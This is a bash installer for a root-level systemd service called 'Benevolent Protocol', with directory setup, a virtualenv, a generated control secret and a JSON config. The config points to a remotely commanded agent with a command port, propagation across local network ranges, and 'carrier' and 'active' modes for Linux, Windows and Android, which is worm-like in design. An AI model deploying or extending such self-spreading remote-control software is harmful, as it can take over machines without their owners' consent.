#!/bin/bash
# Benevolent Protocol Installation Script
# Usage: sudo ./install.sh

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Directories
INSTALL_DIR="/opt/benevolent_protocol"
CONFIG_DIR="/etc/benevolent_protocol"
LOG_DIR="/var/log/benevolent_protocol"
RUN_DIR="/var/run/benevolent_protocol"

echo -e "${GREEN}=== Benevolent Protocol Installer ===${NC}"
echo ""

# Check root
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}Please run as root${NC}"
    exit 1
fi

# Check Python
if ! command -v python3 &> /dev/null; then
    echo -e "${RED}Python 3 is required but not installed.${NC}"
    exit 1
fi

PYTHON_VERSION=$(python3 -c 'import sys; print(".".join(map(str, sys.version_info[:2])))')
if [ "$(echo "$PYTHON_VERSION >= 3.10" | bc)" -ne 1 ]; then
    echo -e "${RED}Python 3.10+ is required. Found: $PYTHON_VERSION${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Python $PYTHON_VERSION found${NC}"

# Create directories
echo ""
echo "Creating directories..."
mkdir -p "$INSTALL_DIR"
mkdir -p "$CONFIG_DIR"
mkdir -p "$LOG_DIR"
mkdir -p "$RUN_DIR"

echo -e "${GREEN}✓ Directories created${NC}"

# Copy files
echo ""
echo "Copying files..."
cp -r src/ "$INSTALL_DIR/"
cp -r config/ "$INSTALL_DIR/"
cp requirements.txt "$INSTALL_DIR/"
cp LICENSE "$INSTALL_DIR/" 2>/dev/null || true
cp README.md "$INSTALL_DIR/" 2>/dev/null || true

echo -e "${GREEN}✓ Files copied${NC}"

# Create virtual environment
echo ""
echo "Creating virtual environment..."
python3 -m venv "$INSTALL_DIR/venv"

echo -e "${GREEN}✓ Virtual environment created${NC}"

# Install dependencies
echo ""
echo "Installing dependencies..."
"$INSTALL_DIR/venv/bin/pip" install --upgrade pip
"$INSTALL_DIR/venv/bin/pip" install -r "$INSTALL_DIR/requirements.txt"

echo -e "${GREEN}✓ Dependencies installed${NC}"

# Generate secret
echo ""
echo "Generating secure secret..."
SECRET=$(python3 -c "import secrets; print(secrets.token_hex(32))")

# Create config if not exists
if [ ! -f "$CONFIG_DIR/config.json" ]; then
    echo ""
    echo "Creating configuration..."
    cat > "$CONFIG_DIR/config.json" << EOF
{
    "telemetry_enabled": true,
    "telemetry_level": "standard",
    "telemetry_endpoint": null,
    "heartbeat_interval": 60,
    "command_port": 9527,
    "optimization_interval": 3600,
    "propagation_enabled": false,
    "gaming_mode_auto_detect": true,
    "max_cpu_percent": 30,
    "max_memory_mb": 500,
    "control_secret": "$SECRET",
    "update_endpoint": null,
    "log_level": "INFO",
    "log_file": "/var/log/benevolent_protocol/protocol.log",
    "platform_mode": "auto",
    "linux_carrier_mode": true,
    "windows_active_mode": true,
    "android_active_mode": true,
    "allowed_networks": ["192.168.0.0/16", "10.0.0.0/8"],
    "excluded_hosts": []
}
EOF
    echo -e "${GREEN}✓ Configuration created${NC}"
    echo -e "${YELLOW}  Config saved to: $CONFIG_DIR/config.json${NC}"
    echo -e "${YELLOW}  Secret: $SECRET${NC}"
    echo -e "${YELLOW}  Save this secret for remote commands!${NC}"
else
    echo -e "${YELLOW}⚠ Config already exists, skipping${NC}"
fi

# Set permissions
echo ""
echo "Setting permissions..."
chmod 600 "$CONFIG_DIR/config.json"
chmod 755 "$LOG_DIR"
chmod 755 "$RUN_DIR"

echo -e "${GREEN}✓ Permissions set${NC}"

# Install systemd service
echo ""
echo "Installing systemd service..."
if [ -f "deploy/benevolent-protocol.service" ]; then
    cp deploy/benevolent-protocol.service /etc/systemd/system/
else
    cat > /etc/systemd/system/benevolent-protocol.service << 'EOF'
[Unit]
Description=Benevolent Protocol
Documentation=https://github.com/r0s-org/benevolent_protocol
After=network.target

[Service]
Type=simple
User=root
Group=root
WorkingDirectory=/opt/benevolent_protocol
Environment="PATH=/opt/benevolent_protocol/venv/bin"
ExecStart=/opt/benevolent_protocol/venv/bin/python -m src.core.orchestrator
Restart=on-failure
RestartSec=10
CPUQuota=30%
MemoryMax=500M

[Install]
WantedBy=multi-user.target
EOF
fi

systemctl daemon-reload
echo -e "${GREEN}✓ Systemd service installed${NC}"

# Summary
echo ""
echo -e "${GREEN}=== Installation Complete ===${NC}"
echo ""
echo "Protocol installed to: $INSTALL_DIR"
echo "Configuration: $CONFIG_DIR/config.json"
echo "Logs: $LOG_DIR/"
echo ""
echo "Commands:"
echo "  Start:   sudo systemctl start benevolent-protocol"
echo "  Stop:    sudo systemctl stop benevolent-protocol"
echo "  Status:  sudo systemctl status benevolent-protocol"
echo "  Logs:    sudo journalctl -u benevolent-protocol -f"
echo "  Enable:  sudo systemctl enable benevolent-protocol"
echo ""
echo -e "${YELLOW}⚠ IMPORTANT: Edit $CONFIG_DIR/config.json before starting!${NC}"
echo ""
